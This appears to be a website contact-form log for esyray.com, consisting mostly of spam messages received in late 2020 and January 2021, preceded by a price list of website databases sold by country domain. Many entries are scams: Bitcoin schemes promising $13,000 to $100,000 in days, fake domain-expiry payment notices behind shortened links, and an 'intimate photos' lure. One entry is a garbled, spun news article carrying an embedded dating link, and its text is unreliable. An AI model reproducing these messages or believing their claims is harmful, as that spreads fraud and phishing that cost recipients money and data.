.ru 514668 websites International zone Russian:.com .net .biz .info .name .tel .mobi .asia-$80 
.rw 3806 websites Rwanda - $30 
.sa 20421 websites Saudi Arabia- $50 
.sa 5064 websites International zone Saudi Arabia:.com .net .biz .info .name .tel .mobi .asia - $30 
.sc 4442 websites Seychelles- $30 
.se 1491677 websites Sweden - $100 
.se 293316 websites International zone Sweden:.com .net .biz .info .name .tel .mobi .asia-$50 
.sg 150351 websites Republic Of Singapore - $50 
.sh 7560 websites Saint Helena - $30 
.si 103778 websites Slovenia- $50 
.si 12879 websites International zone Slovenia:.com .net .biz .info .name .tel .mobi .asia-$50 
.sk 414198 websites Slovakia- $80 
.sk 31572 websites International zone Slovakia:.com .net .biz .info .name .tel .mobi .asia-$50 
.sm 8897 websites San Marino - $30 
.sn 344 websites International zone Senegal:.com .net .biz .info .name .tel .mobi .asia-$30 
.sn 4465 websites Senegal - $30 
.sr 580 websites Suriname - $30 
.sv 8432 websites Salvador- $30 
.sx 2901 websites Sint Maarten - $30 
.sy 2972 websites Syria - $30 
.sz 321 websites Swaziland - $30 
.tc 16384 websites Turks and Caicos Islands- $50 
.tf 19841 websites French Sauthern Territory - $50 
.tg 1230 websites Togo - $30 
.th 22368 websites Kingdom Of Thailand- $50 
.tj 6874 websites Tajikistan- $30 
.tj 34 websites International zone Tajikistan:.com .net .biz .info .name .tel .mobi .asia 
.tk 20085806 websites Tokelau - $500 
.tl 2748 websites East Timor - $30 
.tm 6395 websites Turkmenistan- $30 
.tm 44 websites International zone Turkmenistan:.com .net .biz .info .name .tel .mobi .asia 
.tr 243347 websites Turkey - $80 
.tr 138818 International zone Turkey:.com .net .biz .info .name .tel .mobi .asia -$50 
.tt 1017 websites Trinidad &amp; Tobago  - $30 
.ua 553216 websites Ukraina - $80 
.ua 147202 websites International zone Ukraine:.com .net .biz .info .name .tel .mobi .asia-$50 
.ug 3806 websites Uganda - $30 
.ug 720 websites International zone Uganda:.com .net .biz .info .name .tel .mobi.asia-$30 
.uk 5975887 websites United Kingdom - $250 
.uk 3304606 websites International zone United Kingdom:.com .net .biz .info .name .tel .mobi .asia-$150 
.us 3139563 websites USA - $200 
.us 578927 websites International zone USA:.com .net .biz .info .name .tel .mobi .asia-$80 
.uy 15571 websites Uruguay - $50 
.uy 31812 websites International zone Uruguay:.com .net .biz .info .name .tel .mobi .asia-$30 
.uz 38357 websites Uzbekistan - $50 
.uz  365 websites International zone Uzbekistan:.com .net .biz .info .name .tel .mobi .asia 
.vc 18641 websites Saint Vincent &amp; Grenadines - $50 
.ve 14015 websites Venezuela - $50 
.ve 2898 websites International zone Venezuela:.com .net .biz .info .name .tel .mobi .asia - $30 
.vg 8389 websites Virgin Islands (British) - $50 
.vi 109 websites Virgin Islands (US) - $30 
.vn 436005 websites Vietnam - $80 
.vn 161855 websites International zone Vietnam:.com .net .biz .info .name .tel .mobi .asia - $50 
.vu 1051 websites Vanuatu - $30 
.wf 1133 websites Wallis &amp; Futuna Islands - $30 
.ws 99308 websites Samoa - $80 
.ye 18 websites Yemen - $30 
.yt 2004 websites Mayotte - $30 
.za 1008308 websites South Africa - $100
+++ 2020-12-26 07:38:44 PM -- Email from: Denese Driscoll, -- subject: improve esyray.com  in SERPs, -- email: denese.driscoll@msn.com, -- Message is: Hello

Finally there is a SEO Service that has given proven results and that is backed by the customers! 

For more information, check our service here
https://speed-seo.net/product/serp-booster/


thank you
Peter Driscoll
Speed SEO Agency
support@speed-seo.net
+++ 2020-12-27 07:13:46 AM -- Email from: Kenton Metts, -- subject: How to generate $28,368 in the next 30 Days – 27 Minute Set Up, -- email: kenton.metts78@outlook.com, -- Message is: Does that possibility scare you or excite you?

What if I told you it was REALLY possible FOR EVEN YOU to generate $28,368 or more in the next 30 days, even from a standing start? And you could get started in 27 minutes.

You’d think I was crazy, wouldn’t you?

Now don’t get me wrong, to make $28,368 or more in the next 30 days would be an exceptional result that would require work, work that most people won’t do as they want money to fall from the sky for doing nothing …

… but IT IS POSSIBLE to generate $28,368 over the next 30 days …

#With no list.
#No Website.
#And no experience.

Intrigued?

You should be, and all will be revealed in John’s most groundbreaking presentation ever that he is holding.

This is brand-new content that has never been revealed and I do hope you can join him, I promise you won’t regret it.

Here are the details you need if you want to find out more.

REGISTER HERE

https://usualprospect.com/jtwebinar

To Your Success,

Usual Prospect Team

P.S. – This is a FREE WEBINAR for our subscribers only and John’s gonna show you exactly how to FIX your online business in under 5 minutes! Don’t miss it.

https://usualprospect.com/jtwebinar
+++ 2020-12-27 11:08:35 AM -- Email from: , -- subject: What Does Your Future Holds in 2021, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Do you want to know what kind of events in your life you can expect in coming new year 2021? In case of your interest, we can evolve absolutely accurate our 1-Year Forecast of Events reports for you and your loved ones. Please visit our https://astrologicalstudio.com/home/23-1-year-forecast-of-events.html for more information. We will be delighted to hear from you. Have a great day and a Happy New Year. Best regards Brian WRIGHT Eng., Astrological Studio, https://astrologicalstudio.com
+++ 2020-12-28 05:34:55 PM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2020-12-30 07:27:33 PM -- Email from: Ophelia Folsom, -- subject: Re:Hi!, -- email: folsom.ophelia@googlemail.com, -- Message is: Good Afternoon people at esyray.com,
Hope you’re excellent. 
I'm ,
Hope you’re well, and that clients are profitable. 

Do you need to impress customers? We can add your small business logo on a Huge Truck!
https://slimex365.com/logo893399
With warm regards,
+++ 2020-12-30 09:57:42 PM -- Email from: Eric Jones, -- subject: instead, congrats, -- email: ericjonesonline@outlook.com, -- Message is: Good day, 

My name is Eric and unlike a lot of emails you might get, I wanted to instead provide you with a word of encouragement – Congratulations

What for?  

Part of my job is to check out websites and the work you’ve done with esyray.com definitely stands out. 

It’s clear you took building a website seriously and made a real investment of time and resources into making it top quality.

There is, however, a catch… more accurately, a question…

So when someone like me happens to find your site – maybe at the top of the search results (nice job BTW) or just through a random link, how do you know? 

More importantly, how do you make a connection with that person?

Studies show that 7 out of 10 visitors don’t stick around – they’re there one second and then gone with the wind.

Here’s a way to create INSTANT engagement that you may not have known about… 

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know INSTANTLY that they’re interested – so that you can talk to that lead while they’re literally checking out esyray.com.

CLICK HERE http://www.talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be a game-changer for your business – and it gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately (and there’s literally a 100X difference between contacting someone within 5 minutes versus 30 minutes.)

Plus then, even if you don’t close a deal right away, you can connect later on with text messages for new offers, content links, even just follow up notes to build a relationship.

Everything I’ve just described is simple, easy, and effective. 

CLICK HERE http://www.talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-01-01 12:52:20 PM -- Email from: Mike Gilmore, -- subject: cheap monthly SEO plans, -- email: no-reply@google.com, -- Message is: Hi 
 
I have just analyzed  esyray.com for  the current search visibility and seen that your website could use an upgrade. 
 
We will enhance your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start enhancing your sales and leads with us, today! 
 
regards 
Mike Gilmore
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-01-01 10:30:35 PM -- Email from: KermitThope, -- subject: $ 37,000 a week!, -- email: jacksonKix@ggmmails.com, -- Message is: I like learning about new technologies and extra cash can never hurt, so naturally I was interested in Bitcoin Method. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dl&amp;sa=D&amp;pel=pko&amp;usg=AFQjCNFmgHKtMSzc2MBUFwSylGnIIBwofg   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
When Joe told me I could join for free, I took the opportunity and after just a few months I was earning enough to quit my job! 
 
Now I am my own boss and earn over $ 37,000 a week! 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb&amp;sa=D&amp;awo=oka&amp;usg=AFQjCNE6WXsUPEp5dNV1lG_u3VDmHzsWHA   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-01-01 10:30:35 PM -- Email from: Lewishew, -- subject: $27,484.98 in two days, -- email: jacksonKix@ggmmails.com, -- Message is: Is this for real? 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dq&amp;sa=D&amp;qco=ooo&amp;usg=AFQjCNHVxvk2YmHpOxS9HBrvNR92fr6sBw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
I just joined 2 days ago, and my account balance has already ballooned to a staggering $27,484.98!!! 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb&amp;sa=D&amp;lnl=qgp&amp;usg=AFQjCNE6WXsUPEp5dNV1lG_u3VDmHzsWHA   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-01-01 10:30:35 PM -- Email from: WilliamSlalp, -- subject: How To Earn $ 14,000 A Day By Investing In BITCOIN, The Best Investment Opportunity of the Last Decade, -- email: jacksonKix@ggmmails.com, -- Message is: I kept hearing about Bitcoin on the news, but had no idea how to invest! 
 
That's when I heard about Joe's beta testing. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb&amp;sa=D&amp;qlo=leo&amp;usg=AFQjCNE6WXsUPEp5dNV1lG_u3VDmHzsWHA   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
The whole process was explained to me and I was able to start trading within minutes. 
 
I've made over $ 75,000 so far and I don't see any reason to slow down! 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb&amp;sa=D&amp;ppa=oup&amp;usg=AFQjCNE6WXsUPEp5dNV1lG_u3VDmHzsWHA   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-01-01 10:30:36 PM -- Email from: Ronaldmew, -- subject: $ 100,000...., -- email: jacksonKix@ggmmails.com, -- Message is: I was looking for an easy way to start Bitcoin trading and that was my golden ticket. 
 
I'm not the tech type so I needed someone to walk me through the process. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dl&amp;sa=D&amp;qzq=pmo&amp;usg=AFQjCNFmgHKtMSzc2MBUFwSylGnIIBwofg   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
That's exactly what Joe and his Bitcoin Method did. 
 
Now I have my own $ 100,000 at my disposal! 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Do&amp;sa=D&amp;qel=oso&amp;usg=AFQjCNEK-ZrGWCbJNVLwJWYlUp3sBCEINQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-01-01 10:30:36 PM -- Email from: Francisgrify, -- subject: $13,000 every single day, -- email: jacksonKix@ggmmails.com, -- Message is: The results of the software speaks for itself... 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dl&amp;sa=D&amp;pxo=oso&amp;usg=AFQjCNFmgHKtMSzc2MBUFwSylGnIIBwofg   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
just as promised, I made over $13,000 every single day. 
 
Do I really need to say more? 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Do&amp;sa=D&amp;lso=omo&amp;usg=AFQjCNEK-ZrGWCbJNVLwJWYlUp3sBCEINQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-01-01 10:30:36 PM -- Email from: Larrygat, -- subject: $ 17,300 in just one day!, -- email: jacksonKix@ggmmails.com, -- Message is: I've never really had an interest in investing. 
 
I preferred to keep my money in the bank. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dq&amp;sa=D&amp;azq=poq&amp;usg=AFQjCNHVxvk2YmHpOxS9HBrvNR92fr6sBw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
However, when I returned to college, I started looking for new ways to earn money to pay for all my expenses. 
 
It was then that Joe sent me an email asking me to join Bitcoin Method. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Da&amp;sa=D&amp;omp=lwa&amp;usg=AFQjCNFmdcUrwh_NlvClKeEaVPTKYlFtoA   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
After he explained it to me, I still didn't really understand the rules, but I thought, &quot;Well it's free, so why not?&quot; 
 
So I was pleasantly surprised to find out that I made $ 17,300 in just one day! 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dq&amp;sa=D&amp;ayq=oil&amp;usg=AFQjCNHVxvk2YmHpOxS9HBrvNR92fr6sBw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-01-01 10:30:36 PM -- Email from: Greggpaids, -- subject: Ride The Wave of bitcoin And Earn a Guaranteed $13,000 In Exactly 24 Hours, -- email: jacksonKix@ggmmails.com, -- Message is: When I joined The Bitcoin Code 2 months ago, never could have I ever imagined the series of events that would unfold just days after locking in my free software. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Da&amp;sa=D&amp;aso=paa&amp;usg=AFQjCNFmdcUrwh_NlvClKeEaVPTKYlFtoA   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
I was able to clear my $131,382 debt. There is no greater feeling than to be debt-free. 
 
Now, I’m in the process of buying my dream home. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dq&amp;sa=D&amp;qgp=ldp&amp;usg=AFQjCNHVxvk2YmHpOxS9HBrvNR92fr6sBw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
I still can’t believe this is all really happening…I’m forever grateful to Steve. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;     https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2FbW9Ahb%3Fq%3Dl&amp;sa=D&amp;opp=lkp&amp;usg=AFQjCNFmgHKtMSzc2MBUFwSylGnIIBwofg   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-01-03 10:05:34 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2021-01-05 05:57:02 PM -- Email from: Alison Owens, -- subject: RE: your website, -- email: amanda.fifield@googlemail.com, -- Message is: Hi,

I thought you may be interested in our services. 

Would you like thousands of interested people coming to your website every day? 

People will come to your site from the exact online publications in your category.
This means they want to see what you have to offer.
We are the only service out there who drives visitors to you like this.

Starter campaigns of 5,000 visitors just 54.99. Larger campaigns are available.

For more info please visit us at https://traffic-stampede.com 

Thank you for your time and hope to see you there.

Kind regards,
Alison O.
TS
+++ 2021-01-05 07:25:22 PM -- Email from: Jen Manning, -- subject: RE: Dropshipping, -- email: dsi@eclipso.email, -- Message is: Hi,

I thought you may be interested.
 
We supply the best niche turnkey dropshipping stores out there.
You keep all of the profit. We are the designers this is all we do.

Dropshipping Made Simple
Free hosting, domain and social media marketing materials included.
Just a one time fee for your dropship store and thats it.

Come see our all new available dropship businesses at https://dropshippingincome.com 

We look forward to seeing you on our site.

Kind regards,
Jen M.
DSI
+++ 2021-01-06 03:35:40 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.link/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.link/out.php?site=esyray.com
+++ 2021-01-06 08:49:29 PM -- Email from: Mellisa Kawamoto, -- subject: esyray.com, -- email: esyray.com@esyray.com, -- Message is: DOMAIN SERVICES EXPIRATION NOTICE FOR esyray.com

Domain Notice Expiry ON: Jan 06, 2021


We have actually not obtained a payment from you.
We've attempted to contact you however were not able to contact you.


Check Out: https://cutt.ly/tjf8ssN

For information as well as to process a discretionary payment for your domain website solutions.




010620210500333753688578798esyray.com
+++ 2021-01-07 10:27:14 AM -- Email from: Tankde, -- subject: Charmdate.com, -- email: fgdghhgh@pop.com, -- Message is: while combating social media

how much does the executive order say?The order sets out to clarify the calls Decency Act, A US law that offers online platforms such as Facebook, Twitter and YouTube legal protection in certain situations.

Under Section 230 of legal issues, Social networks are not generally held accountable for content posted by their users but can engage in &quot;Good Samaritan obstructing, Such as doing away with content that is obscene, bothering or violent.

And the draft of the executive order indicates this legal immunity does not apply if a social network edits content posted by its users.

moreover it says &quot;fake&quot; stopping of posts, Including removing a post for reasons other than those described in a website's terms, really should not offered immunity.

Republican senator Marco Rubio is the type of arguing the platforms take on the role of a &quot;writer&quot; when they definitely add fact check labels to specific posts.

&quot;But they were now decided to exercise an editorial role like a publisher, Then they should not shielded from liability and treated as publishers under the law,

The draft of the manager order also calls for:

The Federal contact Commission (FCC) To spell out what type of content blocking will be regarded as deceptive, Pretextual or inconsistent with a service provider's terms and conditionsa review of government advertising on social media sites and whether those platforms impose viewpoint based restrictionsthe re institution of the White House &quot;Tech bias canceling tool&quot; That lets citizens report unfair get rid of by social networksHow have the social networks responded?forums, Which is oftentimes named in the draft of the executive order, become less common to comment.

YouTube, Owned by the net, Has not yet told her.

In a discussion with Fox News on Wednesday, Facebook's leader, mark Zuckerberg, Said censoring a social media platform couldn't survive the &quot;Right response&quot; For a government concered about censorship.

Fox said it would play its full employment with Mr Zuckerberg on Thursday.

One safe and effective think tank warned the executive order could have unintended consequences.

&quot;In time, This orthodox campaign against social media companies could have a devastating effect on the freedom of speech, Matthew Feeney, Of the Cato commence, identified.

And changing the landline calls Decency Act to &quot;Impose politics neutrality on social media companies&quot; Could see the platforms made up of &quot;Legal content they'd otherwise like to clear out&quot; Such as sexually graphic, chaotic imagery and racism.

&quot;Or they would screen content to a degree that would kill the free flow of web data on social media that we're used to today, he was quoted saying.

Mr Feeney &lt;a href=https://www.bestbrides.net/dating-unlocked-understanding-east-european-women/&gt;Charmdate.com&lt;/a&gt; said the draft of the account manager order was a &quot;grime&quot; But could prove politically popular in the run up to a presidential election.

What sparked biggest banking row?The long term dispute between Mr Trump and social media companies flared up again on Tuesday, When two of his posts were given a fact check label by Twitter now.

he had tweeted, Without providing evidence: &quot;there is certainly way (zero) That mail in ballots will be anything less than appreciably fraudulent.
+++ 2021-01-08 03:18:09 AM -- Email from: Antje Struthers, -- subject: , -- email: struthers.antje@googlemail.com, -- Message is: How would you like to check out how you can start up your own work at home business getting paid commissions for selling selling products/services online? Check out: https://bit.ly/earn-cash-with-affiliate-marketing
+++ 2021-01-08 11:09:12 AM -- Email from: Parthenia Canchola, -- subject: esyray.com, -- email: esyray.com@esyray.com, -- Message is: DOMAIN SERVICES EXPIRATION NOTICE FOR esyray.com

Domain Notice Expiry ON: Jan 08, 2021


We have not received a payment from you.
We have actually attempted to contact you yet were unable to contact you.


Check Out: https://bit.ly/35kcMSx

For info as well as to make a discretionary settlement for your domain website service.




010820210422143753688578798esyray.com
+++ 2021-01-09 01:59:41 AM -- Email from: Kyle Anderson, -- subject: Error on your website, -- email: anderson20173@gmail.com, -- Message is: It looks like this link is broken on your site: https://www.esyray.com/contactus.html

I thought you would like to know :).  Silly mistakes can ruin your site's credibility.  I've used a tool called linkSniff.com in the past to keep mistakes off of my website.

-Kyle
+++ 2021-01-10 08:29:31 AM -- Email from: Eric Jones, -- subject: Try this, get more leads, -- email: ericjonesonline@outlook.com, -- Message is: Hi, my name is Eric and I’m betting you’d like your website esyray.com to generate more leads.

Here’s how:
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you as soon as they say they’re interested – so that you can talk to that lead while they’re still there at esyray.com.

Talk With Web Visitor – CLICK HERE http://www.talkwithwebvisitors.com for a live demo now.

And now that you’ve got their phone number, our new SMS Text With Lead feature enables you to start a text (SMS) conversation – answer questions, provide more info, and close a deal that way.

If they don’t take you up on your offer then, just follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE http://www.talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Try Talk With Web Visitor and get more leads now.

Eric
PS: The studies show 7 out of 10 visitors don’t hang around – you can’t afford to lose them!
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-01-11 12:17:12 PM -- Email from: aspic, -- subject: I promised., -- email: starosotnikovb@inbox.ru, -- Message is: Hi, this is Anna. I am sending you my intimate photos as I promised. https://tinyurl.com/y5gcywhh
+++ 2021-01-12 09:33:56 AM -- Email from: , -- subject: What Does Your Future Holds in 2021, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Do you want to know what kind of events in your life you can expect in coming new year 2021? In case of your interest, we can evolve absolutely accurate our 1-Year Forecast of Events reports for you and your loved ones. Please visit our https://astrologicalstudio.com/home/23-1-year-forecast-of-events.html for more information. We will be delighted to hear from you. Have a great day and a Happy New Year. Best regards Brian WRIGHT Eng., Astrological Studio, https://astrologicalstudio.com
+++ 2021-01-13 06:20:32 AM -- Email from: Mike Stanley, -- subject: Increase sales for esyray.com, -- email: see-email-in-message@monkeydigital.co, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a 50+ points in Moz DA with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Stanley
 
support@monkeydigital.co
+++ 2021-01-13 07:21:11 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.link/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.link/out.php?site=esyray.com
+++ 2021-01-13 08:54:39 AM -- Email from: Joey Cashin, -- subject: Re:Hi there! - Website Submitter, -- email: cashin.joey@gmail.com, -- Message is: Hi people at esyray.com,
Hope you’re well. 
I'm ,
Hope you’re good, and that customers are profitable. Please allow me to introduce to you this service.
Automatically submit your website to a large number of search engines like google and directories.
http://disurl.ml/websitesubmitter602223
Regards,
+++ 2021-01-14 12:21:37 PM -- Email from: Roslyn Montoya, -- subject: , -- email: montoya.roslyn@googlemail.com, -- Message is: Would you like completely free advertising for your website? Take a look at this: https://bit.ly/totally-free-ads
+++ 2021-01-15 06:09:35 PM -- Email from: Shirley Boan, -- subject: Can I simply say what a comfort to uncover an individual who actually understands what they're talking about online. You actually know how to bring a problem to light and make it important. More people must check this out and understand this side of the story. It's surprising you are not more popular since you certainly possess the gift., -- email: shirley.boan@outlook.com, -- Message is: Monthly update for marketers business hub of  reviews of paid and free business promotion software and home made natural health remedies!Please hit the unsubscribe button below to be taken off this monthly notification list or you can subscribe to recieve follow up material  when you arrive on our main blog page of free and low cost marketing programs for online businesses   HERE IS THE LINK https://bit.ly/3nxq44b
+++ 2021-01-16 09:01:20 AM -- Email from: Kermit Bibb, -- subject: Re:Attn.: Manager - Website Submitter, -- email: kermit.bibb@gmail.com, -- Message is: Hi people at esyray.com,
Hope you’re excellent. 
I'm ,
Hope you’re great, and that clients are profitable. Please allow me to introduce to you this service.
The quickest way to advertise your website. Just enter your URL. Your competitors make use of this service already.
https://bogazicitente.com/websitesubmitter57512
Best regards,
+++ 2021-01-17 05:51:58 AM -- Email from: Clifton Bertie, -- subject: esyray.com, -- email: esyray.com@esyray.com, -- Message is: DOMAIN SERVICES EXPIRATION NOTICE FOR esyray.com

Domain Notice Expiry ON: Jan 17, 2021


We have not obtained a payment from you.
We've attempted to call you but were unable to contact you.


Go To: https://bit.ly/35NeImy

For details and also to process a discretionary settlement for your domain website services.




011720210051223753688578798esyray.com
+++ 2021-01-19 03:33:06 PM -- Email from: Eric Jones, -- subject: instead, congrats, -- email: ericjonesonline@outlook.com, -- Message is: Good day, 

My name is Eric and unlike a lot of emails you might get, I wanted to instead provide you with a word of encouragement – Congratulations

What for?  

Part of my job is to check out websites and the work you’ve done with esyray.com definitely stands out. 

It’s clear you took building a website seriously and made a real investment of time and resources into making it top quality.

There is, however, a catch… more accurately, a question…

So when someone like me happens to find your site – maybe at the top of the search results (nice job BTW) or just through a random link, how do you know? 

More importantly, how do you make a connection with that person?

Studies show that 7 out of 10 visitors don’t stick around – they’re there one second and then gone with the wind.

Here’s a way to create INSTANT engagement that you may not have known about… 

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know INSTANTLY that they’re interested – so that you can talk to that lead while they’re literally checking out esyray.com.

CLICK HERE http://www.talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be a game-changer for your business – and it gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately (and there’s literally a 100X difference between contacting someone within 5 minutes versus 30 minutes.)

Plus then, even if you don’t close a deal right away, you can connect later on with text messages for new offers, content links, even just follow up notes to build a relationship.

Everything I’ve just described is simple, easy, and effective. 

CLICK HERE http://www.talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-01-20 07:13:56 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 
